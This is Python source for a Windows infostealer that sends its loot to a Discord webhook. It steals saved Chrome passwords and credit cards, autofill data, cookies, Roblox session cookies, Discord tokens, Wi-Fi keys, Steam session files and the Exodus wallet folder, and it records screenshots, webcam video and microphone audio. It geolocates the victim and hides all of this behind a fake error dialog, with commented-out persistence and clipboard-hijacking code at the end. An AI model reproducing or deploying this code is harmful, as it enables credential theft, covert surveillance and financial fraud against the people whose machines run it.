#Import libraries
from discord_webhook import DiscordEmbed, DiscordWebhook
import browser_cookie3
import subprocess
import json
import socket
import re
import sys
import os
import shutil
import uuid
import psutil
from browser_history import get_history
import chrome_bookmarks
import zipfile
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import datetime, timedelta
from PIL import ImageGrab
import cv2
import requests
import sounddevice as sd
import numpy as np
import wavio 
import threading
import ctypes
import winreg as wrg
import pywifi
import urllib


webhookurl=""
wifiencoding="utf-8"
api_key = 'WIgle API'

webhook = DiscordWebhook(url=webhookurl[::-1])#Set up webhook
userhome = os.path.expanduser('~')
folderdir=os.path.join(userhome,'Data')
startfolder = os.path.join(userhome, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
script_file = os.path.basename(sys.executable)
startup_script_path = os.path.join(startfolder, script_file)

class DateTimeEncoder(json.JSONEncoder):
    def default(self, o):
        if isinstance(o, datetime):
            return o.strftime("%Y-%m-%d %H:%M:%S")
        return super().default(o)

def convert_timestamp_to_readable(timestamp):
    # Convert timestamp to a readable date format
    return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S') if timestamp else "Session Cookie"

def copy_to_startup():
    try:
     if not os.path.exists(startup_script_path):
        shutil.copy2(sys.executable, startfolder)
    except PermissionError as e:
        pass  

webhook = DiscordWebhook(url=webhookurl)#Set up webhook

def ip6():#get ipv6
    try:
     try:
       ip=requests.get('https://6.ident.me')
       return ip.text
     except:
       ip=requests.get('https://6.tnedi.me')
       return ip.text
    except:
        return None
def wifipass():
    try:
     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp949').split('\n')
    except subprocess.CalledProcessError: 
        return None
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    wifi_info = {}

    if not profiles:
        return None

    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp949').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            wifi_info[i] = results[0]
        except IndexError:
            wifi_info[i] = ""

    return wifi_info 
wifi=wifipass()


r = requests.get('http://ipinfo.io/json')
data=r.json()
if 'ip' in data:
    ip4=data['ip']
if 'org' in data:
    org = data['org']
else:
     org = None
if 'city' in data:
    city = data['city']
else:
    city = None
if 'country' in data:
    country = data['country']
else:
    country = None
if 'region' in data:
    region = data['region']
else:
    region = None
if 'loc' in data:
    loc = data['loc']
    latlong = str(loc).split(',')
    lat, long = latlong[0], latlong[1]
else:
    lat, long = None, None
if 'postal' in data:
    postal = data['postal']
else:
    postal = None
if 'timezone' in data:
    timezone = data['timezone']
else:
    timezone = None
if 'hostname' in data:
     hostname = data['hostname']
else:
     hostname = None       



def edge_logger():
    try:
        rcookies = browser_cookie3.edge(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in edge_logger: {str(e)}")
        return None
def chrome_logger():
    try:
        rcookies = browser_cookie3.chrome(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in chrome_logger: {str(e)}")
        return None
def firefox_logger():
    try:
        rcookies = browser_cookie3.firefox(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in firefox_logger: {str(e)}")
        return None
def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return cookie
    except Exception as e:
        print(f"Error occurred in opera_logger: {str(e)}")
        return None  
def operagx_logger():
    try:
        rcookies = browser_cookie3.opera_gx(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in operagx_logger: {str(e)}")
        return None
def chromium_logger():
    try:
        rcookies = browser_cookie3.chromium(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in chromium_logger: {str(e)}")
        return None    

roblochrome,robloedge,roblofire,robloopera,roblogx,roblochromium=chrome_logger(),edge_logger(),firefox_logger(),opera_logger(),operagx_logger(),chromium_logger()

def sysinfo():
    location = wrg.HKEY_LOCAL_MACHINE

    # Define the registry paths
    GPUpath = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinSAT"
    CPUpath = r"HARDWARE\DESCRIPTION\System\CentralProcessor\0"
    CpuCorepath = r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
    Motherboardpath = r"HARDWARE\DESCRIPTION\System\BIOS"
    OSpath = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
    productkeypath = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform"
    biosverpath = r"HARDWARE\DESCRIPTION\System"


    try:
        soft1 = wrg.OpenKeyEx(location, GPUpath)
        soft2 = wrg.OpenKeyEx(location, CPUpath)
        soft3 = wrg.OpenKeyEx(location, Motherboardpath)
        soft4 = wrg.OpenKeyEx(location, OSpath)
        soft5 = wrg.OpenKeyEx(location, biosverpath)
        soft6 = wrg.OpenKeyEx(location, productkeypath)
        soft7 = wrg.OpenKeyEx(location, CpuCorepath)

        GPU = wrg.QueryValueEx(soft1, "PrimaryAdapterString")
        CPU = wrg.QueryValueEx(soft2, "ProcessorNameString")
        RAM = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        Cpucorecount = wrg.QueryValueEx(soft7, "NUMBER_OF_PROCESSORS")
        CpuArchitecture = wrg.QueryValueEx(soft7, "PROCESSOR_ARCHITECTURE")
        Motherboard = wrg.QueryValueEx(soft3, "BaseBoardProduct")
        MotherboardProdname = wrg.QueryValueEx(soft3, "SystemProductName")
        OSversion = wrg.QueryValueEx(soft4, "ProductName")
        OSbuild = wrg.QueryValueEx(soft4, "CurrentBuildNumber")
        OSproductID = wrg.QueryValueEx(soft4, "ProductId")
        ProductKey= wrg.QueryValueEx(soft6, "BackupProductKeyDefault") 
        bios = wrg.QueryValueEx(soft5, "SystemBiosVersion")
        MacAddress=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        hostname=socket.gethostname()

        wrg.CloseKey(soft1)
        wrg.CloseKey(soft2)
        wrg.CloseKey(soft3)
        wrg.CloseKey(soft4)
        wrg.CloseKey(soft5)

        # Convert the bios value to a string and replace commas with spaces
        
        bios_str = " ".join(bios[0]).replace(',', ' ')

        return CPU[0],Cpucorecount[0],CpuArchitecture[0], GPU[0], RAM, Motherboard[0], MotherboardProdname[0], OSversion[0], OSbuild[0],OSproductID[0],ProductKey[0] ,bios_str , MacAddress, hostname
    except FileNotFoundError:
        print("The specified path is not found in the Windows Registry.")
        return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None
info =sysinfo()
CPU, CPUCores, CPUarchitecture, GPU, RAM,Motherboard, MotherboardProd, OSversion, OSbuild, ProductID, ProductKey, bios ,MacAddress, hostname= info
sysinfodata = {
    "CPU": CPU,
    "CPU cores": CPUCores,
    "CPU Architecture": CPUarchitecture,
    "RAM": RAM,
    "GPU": GPU,
    "Motherboard": Motherboard,
    "Motherboard Product Name": MotherboardProd,
    "OS Version": OSversion,
    "OS Build": OSbuild,
    "OS ProductID": ProductID,
    "OS Product Key": ProductKey,
    "Bios version": bios,
    "Mac address": MacAddress
}

def history():
    history = get_history()
    his = history.histories
    with open(os.path.join(userhome,'history.txt'), 'w') as file:
     for item in his:
        json.dump(item, file, cls=DateTimeEncoder)
        file.write('\n')
    with open(os.path.join(userhome,'history.txt'), 'r') as file:
     filedata=file.read()
    try:
         # trying to remove the copied db file as
         # well from the local computer
         os.remove(os.path.join(userhome,"history.txt"))
    except:
          pass  
    return filedata  
def bookmarks():
    with open(os.path.join(userhome,'bookmarks.txt'),'w') as file:
     for url in chrome_bookmarks.urls:
      json.dump(url.url, file, cls=DateTimeEncoder)
      file.write('\n')
    with open(os.path.join(userhome,'bookmarks.txt'), 'r') as file:
     filedata=file.read() 
    try:
         # trying to remove the copied db file as
         # well from the local computer
         os.remove(os.path.join(userhome,"bookmarks.txt"))
    except:
         pass 
    return filedata   
def cookies():
    cookies = list(browser_cookie3.chrome()) 
    
    with open(os.path.join(userhome, 'cookies.txt'), 'w') as file:
        for cookie in cookies:
            file.write(f'Name: {cookie.name}\n')
            file.write(f'Value: {cookie.value}\n')
            file.write(f'Domain: {cookie.domain}\n')
            file.write(f'Path: {cookie.path}\n')
            file.write(f'{cookie.secure}\n')
            file.write(f'Expires: {convert_timestamp_to_readable(cookie.expires)}\n')
            file.write('***********************************\n')
    with open(os.path.join(userhome, 'cookies.txt'),'r') as file:
        filedata=file.read()
    try:
         # trying to remove the copied db file as
         # well from the local computer
         os.remove(os.path.join(userhome,"cookies.txt"))
    except:
         pass    
    return filedata                            
def zipfolder():
    folder_name = f'{os.environ["TEMP"]}\\LocalCache'
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

    # Add a file to the created folder
    file_path = os.path.join(folder_name, "History.txt")
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(history())
    file_path = os.path.join(folder_name, "Bookmarks.txt")
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(bookmarks())
    file_path = os.path.join(folder_name, "Cookie.txt")
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(cookies())
    file_path = os.path.join(folder_name, "Credit-Cards.txt")
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(web_data()[0])
    file_path = os.path.join(folder_name, "Autofill.txt")
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(web_data()[1])
    file_path = os.path.join(folder_name, "Extracted-Passwords.txt")
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(SavedChromepass())



    zip_file_path = folder_name + ".zip"
    with zipfile.ZipFile(zip_file_path, 'w') as zipf:
        for root, _, files in os.walk(folder_name):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, folder_name))



    if os.path.exists(folder_name) and os.path.isdir(folder_name):
     # List all files and subdirectories in the directory
     for item in os.listdir(folder_name):
        item_path = os.path.join(folder_name, item)
        
        # Check if it's a file and not a subdirectory
        if os.path.isfile(item_path):
            try:
                # Delete the file
                os.remove(item_path)
                print(f"Deleted: {item_path}")
            except Exception as e:
                print(f"Error deleting {item_path}: {str(e)}")
    else:
     print(f"Directory {folder_name} does not exist or is not a directory.")

    return zip_file_path
    
def chrome_date_and_time(chrome_data):
	# Chrome_data format is 'year-month-date
	# hr:mins:seconds.milliseconds
	# This will return datetime.datetime Object
	return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
def fetching_chrome_encryption_key():
	# Local_computer_directory_path will look
	# like this below
	# C: => Users => <Your_Name> => AppData =>
	# Local => Google => Chrome => User Data =>
	# Local State
	local_computer_directory_path = os.path.join(
	os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
	"User Data", "Local State")
	
	with open(local_computer_directory_path, "r", encoding="utf-8") as f:
		local_state_data = f.read()
		local_state_data = json.loads(local_state_data)

	# decoding the encryption key using base64
	encryption_key = base64.b64decode(
	local_state_data["os_crypt"]["encrypted_key"])
	
	# remove Windows Data Protection API (DPAPI) str
	encryption_key = encryption_key[5:]
	
	# return decrypted key
	return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
def password_decryption(password, encryption_key):
	try:
		iv = password[3:15]
		password = password[15:]
		
		# generate cipher
		cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
		
		# decrypt password
		return cipher.decrypt(password)[:-16].decode()
	except:
		
		try:
			return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
		except:
			return "No Passwords"
def web_data():
    creditcards = ""
    try:
        web_data_db = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
            "User Data", "Default", "Web Data")
        web_data_db_copy = os.path.join(
            os.getenv("TEMP"), "Web.db")
        shutil.copy2(web_data_db, web_data_db_copy)
        conn = sqlite3.connect(web_data_db_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value FROM autofill")

            with open(os.path.join(userhome,"autofill.txt"), "w", encoding="utf-8") as f:
                for item in cursor.fetchall():
                    name = item[0]
                    value = item[1]
                    f.write(f"{name}: {value}\n")
            with open(os.path.join(userhome,'autofill.txt'),'r',encoding='utf-8') as f:
                autofill=f.read()        
            cursor.execute("SELECT * FROM credit_cards")

            with open(os.path.join(userhome,"credit_cards.txt"), "w", encoding="utf-8") as f:
                for item in cursor.fetchall():
                    username = item[1]
                    encrypted_password = item[4]
                    decrypted_password = password_decryption(
                        encrypted_password, fetching_chrome_encryption_key())
                    expire_mon = item[2]
                    expire_year = item[3]
                    f.write(f"USR: {username}\nPDW: {decrypted_password}\nEXP: {expire_mon}/{expire_year}\n\n")
            with open('credit_cards.txt','r',encoding='utf-8') as f:
                creditcards=f.read()
        except sqlite3.Error:
            pass
        
        conn.close()
        os.remove(web_data_db_copy)
        try:
         # trying to remove the copied db file as
         # well from the local computer
         os.remove(os.path.join(userhome,"credit_cards.txt"))
        except:
         pass 
        try:
         # trying to remove the copied db file as
         # well from the local computer
         os.remove(os.path.join(userhome,"autofill.txt"))
        except:
         pass
    except Exception as e:
        print("Error:", e)
    return creditcards, autofill
def SavedChromepass():

    # Call the existing main() function to extract login passwords
    key = fetching_chrome_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)

    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # List to store the extracted passwords
    extracted_passwords = []

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usage = row[5]

        if user_name or decrypted_password:
            extracted_passwords.append({
                "Main URL": main_url,
                "Login URL": login_page_url,
                "User name": user_name,
                "Decrypted Password": decrypted_password,
                "Creation date": str(chrome_date_and_time(date_of_creation)) if date_of_creation != 86400000000 and date_of_creation else "",
                "Last Used": str(chrome_date_and_time(last_usage)) if last_usage != 86400000000 and last_usage else ""
            })
   
    cursor.close()
    db.close()
   
# os.path.join(userhome,
    # Write extracted passwords to a file
    with open(os.path.join(userhome,"extracted_passwords.txt"), "w", encoding="utf-8") as file:
        for entry in extracted_passwords:
            file.write("\n".join(f"{k}: {v}" for k, v in entry.items()) + "\n")
            file.write("**************************************************************")
            file.write('\n')
            
    with open(os.path.join(userhome,"extracted_passwords.txt"), "r", encoding="utf-8") as file:
       filedata=file.read()

    try:
        # trying to remove the copied db file as
        # well from the local computer
        os.remove(filename)
    except:
        pass 
    try:
        # trying to remove the copied db file as
        # well from the local computer
        os.remove(os.path.join(userhome,"extracted_passwords.txt"))
    except:
        pass 
    return filedata     

def Discordtokens():
    tokens = []
    local = os.getenv("localAPPDATA")
    roaming = os.getenv("APPDATA")
    hook = ""
    paths = {
            "Discord"               : roaming + "\\Discord",
            "Discord Canary"        : roaming + "\\discordcanary",
            "Discord PTB"           : roaming + "\\discordptb",
            "Google Chrome"         : local + "\\Google\\Chrome\\User Data\\Default",
            "Opera"                 : roaming + "\\Opera Software\\Opera Stable",
            "Brave"                 : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"                : local + "\\Yandex\\YandexBrowser\\User Data\\Default",
            'Lightcord'             : roaming + "\\Lightcord",
            'Opera GX'              : roaming + "\\Opera Software\\Opera GX Stable",
            'Amigo'                 : local + "\\Amigo\\User Data",
            'Torch'                 : local + "\\Torch\\User Data",
            'Kometa'                : local + "\\Kometa\\User Data",
            'Orbitum'               : local + "\\Orbitum\\User Data",
            'CentBrowser'           : local + "\\CentBrowser\\User Data",
            'Sputnik'               : local + "\\Sputnik\\Sputnik\\User Data",
            'Chrome SxS'            : local + "\\Google\\Chrome SxS\\User Data",
            'Epic Privacy Browser'  : local + "\\Epic Privacy Browser\\User Data",
            'Microsoft Edge'        : local + "\\Microsoft\\Edge\\User Data\\Default",
            'Uran'                  : local + "\\uCozMedia\\Uran\\User Data\\Default",
            'Iridium'               : local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
            'Firefox'               : roaming + "\\Mozilla\\Firefox\\Profiles",
        }
    try:
     for platform, path in paths.items():
        path = os.path.join(path, "local Storage", "leveldb")
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                    with open(os.path.join(path, file_name), errors="ignore") as file:
                        for line in file.readlines():
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}",r"[\w-]{24}\.[\w-]{6}\.[\w-]{23}-[\w-]{14}"):
                                for token in re.findall(regex, line):
                                    if f"{token} | {platform}" not in tokens:
                                        tokens.append(token)
    except:
        pass                                    
    return tokens                                    

def screenie():
    sss = ImageGrab.grab(
            bbox=None,
            all_screens=True,
            include_layered_windows=False,
            xdisplay=None
    )
    sss.save(userhome+"\\AppData\\Local\\Temp\\ss.png")
    with open(userhome+"\\AppData\\Local\\Temp\\ss.png", "rb")as file:
     webhook.add_file(file.read(),'SCREENIE.png')
    try:
     os.remove(userhome+"\\AppData\\Local\\Temp\\ss.png")
    except:
     pass

def exo():
 if os.path.exists(userhome+"\\AppData\\Roaming\\Exodus"):
  try:   
   shutil.copytree(userhome+"\\AppData\\Roaming\\Exodus", userhome+"\\AppData\\Local\\Temp\\Exodus")
  except FileExistsError as e:
      pass
  shutil.make_archive(userhome+"\\AppData\\Local\\Temp\\Exodus", "zip", userhome+"\\AppData\\Local\\Temp\\Exodus")

  with open(userhome+"\\AppData\\Local\\Temp\\Exodus.zip", 'rb') as f:
      webhook.add_file(f.read(),'exodusCryptoAppdata.zip')
  try:
   os.remove(userhome+"\\AppData\\Local\\Temp\\Exodus.zip")
   os.remove(userhome+"\\AppData\\Local\\Temp\\Exodus")
  except:
    pass

def webcam():
    # Open the device at the ID 0
    cap = cv2.VideoCapture(0)

    # Check whether the user-selected camera is opened successfully.
    if not cap.isOpened():
        NoWebcamEmbed = DiscordEmbed(title='No Webcam Detected!')
        webhook.add_embed(NoWebcamEmbed)

    # To set the resolution
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

    # Define the codec and create VideoWriter object
    fourcc = cv2.VideoWriter_fourcc(*'MJPG')
    output_video_path = os.path.join(userhome, 'output_video.avi')
    out = cv2.VideoWriter(output_video_path, fourcc, 20.0, (640, 480))

    # Record the video for 5 seconds (100 frames at 20 frames per second)
    frame_count = 0
    while frame_count < 100:
        # Capture frame-by-frame
        ret, frame = cap.read()

        # Write the frame to the video file
        out.write(frame)

        # Increment the frame count
        frame_count += 1

        # Wait for 50 milliseconds per frame
        cv2.waitKey(50)

    # Release the capture, close the window, and stop recording
    cap.release()
    out.release()
    cv2.destroyAllWindows()

    # Read the video data in binary mode
    with open(output_video_path, 'rb') as f:
        videodata = f.read()

    try:
        os.remove(output_video_path)
    except:
        pass

    webhook.add_file(videodata, 'WebcamVideo.avi')
def record_audio(duration=5, freq=44100, channels=2):
    try:
        # Start recording with the given values of duration and sample frequency
        recording = sd.rec(int(duration * freq), samplerate=freq, channels=channels, dtype=np.int16)
        print("Recording...")

        # Wait for the recording to finish
        sd.wait()

        # Save the recorded audio to a WAV file
        wavio.write(os.path.join(userhome, 'MicRecording.wav'), recording, freq, sampwidth=2)

        print("Recording saved as", 'MicRecording.wav')
        with open(os.path.join(userhome, 'MicRecording.wav'), 'rb') as f:
            audio = f.read()
        webhook.add_file(audio, 'MicRecording.wav')
        try:
           os.remove(os.path.join(userhome, 'MicRecording.wav'))
        except:
            pass    
    except Exception as e:
        print("Error:", str(e))

def steamssfnconfig():
    steam_path = ""
    if os.path.exists(os.environ["PROGRAMFILES(X86)"] + "\\steam"):
        steam_path = os.environ["PROGRAMFILES(X86)"] + "\\steam"
        ssfn = []
        config = ""
        for file in os.listdir(steam_path):
            if file[:4] == "ssfn":
                ssfn.append(steam_path + f"\\{file}")

        def steam(path, path1, steam_session):
            for root, dirs, file_name in os.walk(path):
                for file in file_name:
                    steam_session.write(root + "\\" + file)
            for file2 in path1:
                steam_session.write(file2)

        if os.path.exists(steam_path + "\\config"):
            with zipfile.ZipFile(f"{os.environ['TEMP']}\\steam_session.zip", 'w', zipfile.ZIP_DEFLATED) as zp:
                steam(steam_path + "\\config", ssfn, zp)

        file = open(f"{os.environ['TEMP']}\\steam_session.zip", "rb")
        webhook.add_file(file.read(), 'steamssfn+config.zip')
        file.close()

        try:
            os.remove(f"{os.environ['TEMP']}\\steam_session.zip")

        except:
            pass
steamssfnconfig()

def get_ethernet_interfaces_info():
    interface_info = []
    all_interfaces = psutil.net_if_stats()
    all_addresses = psutil.net_if_addrs()

    for interface, stats in all_interfaces.items():
        if stats.isup and "eth" in interface.lower():
            ipv4_address = None
            ipv6_address = None
            subnet_mask_ipv4 = None
            subnet_mask_ipv6 = None

            addresses = all_addresses.get(interface, [])

            for addr in addresses:
                if addr.family == socket.AF_INET and not ipv4_address:
                    ipv4_address = addr.address
                    subnet_mask_ipv4 = addr.netmask
                elif addr.family == socket.AF_INET6 and not ipv6_address:
                    ipv6_address = addr.address
                    subnet_mask_ipv6 = addr.netmask

            interface_data = {
                "Interface": interface,
                "MAC Address": addresses[0].address if addresses else None,
                "Bogon IP Address": ipv4_address,
                "IPv4 Subnet Mask": subnet_mask_ipv4,
                "IPv6 Address": ipv6_address,
                "IPv6 Subnet Mask": subnet_mask_ipv6,
                "Speed (Mbps)": stats.speed,
                "Duplex Mode": "Full-Duplex" if stats.duplex == 2 else "Half-Duplex",
            }

            interface_info.append(interface_data)

    return interface_info

def get_wifi_interfaces_info():
    interface_info = []
    all_interfaces = psutil.net_if_stats()
    all_addresses = psutil.net_if_addrs()
    
    for interface, stats in all_interfaces.items():
        if stats.isup and "wlan" in interface.lower():  # Replace with appropriate prefix
            ipv4_address = None
            ipv6_address = None
            subnet_mask_ipv4 = None
            subnet_mask_ipv6 = None
            
            addresses = all_addresses.get(interface, [])
            
            for addr in addresses:
                if addr.family == socket.AF_INET and not ipv4_address:
                    ipv4_address = addr.address
                    subnet_mask_ipv4 = addr.netmask
                elif addr.family == socket.AF_INET6 and not ipv6_address:
                    ipv6_address = addr.address
                    subnet_mask_ipv6 = addr.netmask
            
            interface_data = {
                "Interface": interface,
                "MAC Address": addresses[0].address if addresses else None,
                "Bogon IP Address": ipv4_address,
                "IPv4 Subnet Mask": subnet_mask_ipv4,
                "IPv6 Address": ipv6_address,
                "IPv6 Subnet Mask": subnet_mask_ipv6,
                "Speed (Mbps)": stats.speed,
                "Duplex Mode": "Full-Duplex" if stats.duplex == 2 else "Half-Duplex",
            }
            
            interface_info.append(interface_data)
    
    return interface_info

def get_strongest_wifi_info():
    wifi_info = []
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Assuming the first interface; adjust as needed

    strongest_signal = -100  # Set to a low initial value
    strongest_signal_network = None

    for scan_result in iface.scan_results():
        wifi_data = {
            "SSID": scan_result.ssid,
            "BSSID": scan_result.bssid,
            "Signal Strength (dBm)": scan_result.signal,
            "Encryption Type": scan_result.akm,
        }
        wifi_info.append(wifi_data)

        # Check if the current network has a stronger signal
        if scan_result.signal > strongest_signal:
            strongest_signal = scan_result.signal
            strongest_signal_network = wifi_data

    return strongest_signal_network

def wigledata():
    ssid=''
    api_url = 'https://api.wigle.net/api/v2/network/search'
    if get_strongest_wifi_info()[1] is None:
        return None
    else:
        ssid=get_strongest_wifi_info()[1] 
        
    params = {
        'first': '0',
        'freenet': 'false',
        'paynet': 'false',
        'closestLong': lat,
        'closestLat': long,
        'ssid': str(ssid),
    }
    headers = {
        'Authorization': f'Basic {api_key}',
    }

    response = requests.get(api_url, headers=headers, params=params)
    
    if response.status_code == 200:
        try:
            wigle_data = response.json()
            print(wigle_data)
            # Process the response data as needed
            if 'results' in wigle_data and wigle_data['results']:
                first_result = wigle_data['results'][0]  # Access the first result
                wigleembed = DiscordEmbed(title='WiGLE wifi data', description='', color='4DBDD0')
                for item, key in first_result.items():
                    key = f'```{key}```'
                    wigleembed.add_embed_field(name=item, value=str(key))
                webhook.add_embed(wigleembed)
            else:
                print("No results in the response.")
        except ValueError as e:
            print("Error parsing JSON response:", e)
    else:
        print("API request failed with status code:", response.status_code)
        print("Response content:", response.text)
wigledata()    
    
   
webcamthread=threading.Thread(target=webcam)

micthread=threading.Thread(target=record_audio)

geolocationembed=DiscordEmbed(title='IP and Geolocation Data',description=f'```IPv4: {ip4}```\n```IPv6: {ip6()}```\n```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```\n```Router Hostname: {hostname}```',color='fcba03')
robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```\nOperaGX:```{roblogx}```\nChromium:```{roblochromium}```',color='6f00ff')
sysembed=DiscordEmbed(title='System Information',description=f'### System Info:',color='ab222b')
discordtokenembed= DiscordEmbed(title='Discord Token(s)',description='### Tokens:\n')
discordtokeninfoembed= DiscordEmbed()


webcamthread.start()
 
micthread.start()
try:
    
 with open(zipfolder(),'rb') as file:
       webhook.add_file(file.read(), "History-Bookmarks-Cookies-Passwords-CreditCards-Autofill.zip")
       print(f'removing {zipfolder()}')
       try:
           file.close()
           os.remove(zipfolder())
           print('removed zip folder')
       except Exception as e:
        print(f"Error removing file: {str(e)}")    
except PermissionError as e:
    errorembed = DiscordEmbed(title='Permission error to access the Saved browser files',description='```Victim needs computer shutdown for restrictions to be lifted```')
    webhook.add_embed(errorembed)   

tokenamt=0 
tokenlistamt=len(Discordtokens())   
for token in Discordtokens():
    tokenamt += 1
    field_name = f'**Token {tokenamt}**'  # Create a field name based on the token count
    field_value = f'```{token}```'  # Use the token as the field value
    discordtokenembed.add_embed_field(name=field_name, value=field_value)
    print(f'added token{tokenamt}')

    # Check if you've added all available tokens and break the loop if needed
    if tokenamt == tokenlistamt:
        break

for key, value in sysinfodata.items():
    value = f'```{value}```'
    sysembed.add_embed_field(name=key, value=value)

if wifi:
    wifi_embed = DiscordEmbed(title='WiFi Passwords',description='### Wifi SSID and passwords', color=65280)  # Green color
    for ssid, password in wifi.items():
        password = f'```{password}```'
        wifi_embed.add_embed_field(name=ssid, value=password)
	    
ethernet_interfaces_info = get_ethernet_interfaces_info()
ethernet_interfaces_embeds = []
for interface_info in ethernet_interfaces_info:
    etherembed = DiscordEmbed(title='Ethernet interface(s) info', description='', color='4DBDD0')
    for item, key in interface_info.items():
        key=f'```{key}```'
        etherembed.add_embed_field(name=item, value=str(key))
    ethernet_interfaces_embeds.append(etherembed)

wifi_info=get_wifi_interfaces_info()
wifi_embeds=[]
for interface in wifi_info:
    wifiembed=DiscordEmbed(title='Wifi interfaces(s) info',color='4DBDD0')
    for item, key in interface.items():
        key=f'```{key}```'
        wifi_embeds.add_embed_field(name=item,value=str(key))
    wifi_embeds.append(wifiembed)    

webhook.add_embed(sysembed) 
webhook.add_embed(wifi_embed)
webhook.add_embed(geolocationembed)
webhook.add_embed(robloxembed)
webhook.add_embed(discordtokenembed)

if ethernet_interfaces_embeds:
    for embed in ethernet_interfaces_embeds:
        webhook.add_embed(embed)
else:
    noetherembed=DiscordEmbed(title='Ethernet interfaces(s) info', description='No ethernet interfaces found',color='4DBDD0')
    webhook.add_embed(noetherembed) 

if wifi_embeds:
    for embed in wifi_embeds:
        webhook.add_embed()
else:
    nowifiembed=DiscordEmbed(title='Wifi interfaces(s) info', description='No wifi interfaces found',color='4DBDD0')
    webhook.add_embed(nowifiembed)  

if get_strongest_wifi_info() is not None:
    strongwifiembed=DiscordEmbed(title='Strongest/closest Wifi network',description='',color='4DBDD0')
    for item , key in get_strongest_wifi_info().items():
        key=f'```{key}```'
        strongwifiembed.add_embed_field(name=item,value=str(key))
    webhook.add_embed(strongwifiembed)  
else:
    nonetworkembed=DiscordEmbed(title='Strongest/closest Wifi network', description='No Wi-Fi networks within range were found.',color='4DBDD0')
    webhook.add_embed(nonetworkembed) 

screenie()#screenshots the users screen(s)  
exo()#get exodus cryptowallet Appdata and adds the zip to webhook

webcamthread.join()
micthread.join()

print('sent webhook')
webhook.execute()
ctypes.windll.user32.MessageBoxW(0, "Error 99: Please try again later", "An error as occured", 1)
#if not os.path.realpath(sys.executable) == startup_script_path:
#    copy_to_startup()
#    webhook.execute()
#    os.remove(os.path.realpath(sys.executable))
#elif os.path.realpath(sys.executable) == startup_script_path:
#    while True:
#     try:
#         clipboarddata = pyperclip.paste()
#         ourbtc = re.search(r'^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,}$', clipboarddata)
#         if ourbtc:
